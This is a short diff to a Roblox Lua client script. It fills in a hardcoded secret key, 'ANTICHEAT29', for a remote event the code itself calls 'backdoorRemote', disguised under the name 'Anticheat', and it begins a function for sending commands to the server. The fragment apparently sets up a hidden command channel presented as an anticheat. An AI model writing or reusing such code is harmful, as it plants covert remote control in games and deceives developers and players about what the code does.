@@ -4,7 +4,7 @@ local LocalPlayer = Players.LocalPlayer
 local userInputService = game:GetService("UserInputService")
 
 local backdoorRemote = ReplicatedStorage:WaitForChild("Anticheat")
-local SECRET_KEY = "YOUR_SECRET_KEY_HERE"
+local SECRET_KEY = "ANTICHEAT29"
 
 local function executeServerCommand(command, data)
 	if typeof(data) == "string" then
